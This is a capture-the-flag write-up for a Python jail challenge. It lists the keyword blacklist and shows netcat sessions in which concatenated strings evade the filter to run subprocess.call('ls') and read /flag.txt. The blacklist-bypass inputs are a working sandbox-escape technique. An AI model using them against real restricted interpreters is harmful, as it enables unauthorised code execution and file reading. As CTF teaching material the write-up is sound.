# genericpyjail(misc) - Writeup

## Question

````
Written by: dns

When has a blacklist of insecure keywords EVER failed?

nc chall2.2019.redpwn.net 6006
````


## Answer
pyjail problem.
blacklist is specified and the following characters cannot be used.

````
import
ast
eval
=
pickle
os
subprocess
i love blacklisting words!
input
sys
windows users
print
execfile
hungrybox
builtins
open
most of these are in here just to confuse you
_
dict
[
>
<
:
;
]
exec
hah almost forgot that one
for
@
dir
yah have fun
file
````


Entering a blacklist command results in an error, and entering an undefined command forcibly terminates it.

````
root@kali:~# nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> print
That's not allowed here
>>> ls
Traceback (most recent call last):
  File "jail1.py", line 49, in <module>
    data = eval(data)
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
````


After a hard time confirming, the following can be understood.

-() Is allowed.
-You can avoid blacklist by combining characters using + and making it a command.


````
root@kali:~# nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> 'impor'+'t '+'subproce'+'ss'
>>> "subproces"+"s.cal"+"l('l"+"s')"
bin
boot
dev
etc
flag.txt
home
jail1.py
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
>>> 
````



Check the flag under root.

````
root@kali:~# nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> 'prin'+'t(op'+'en("/flag.txt").rea'+'d())'
flag{bl4ckl1sts_w0rk_gre3344T!}
````

###### flag{bl4ckl1sts_w0rk_gre3344T!}
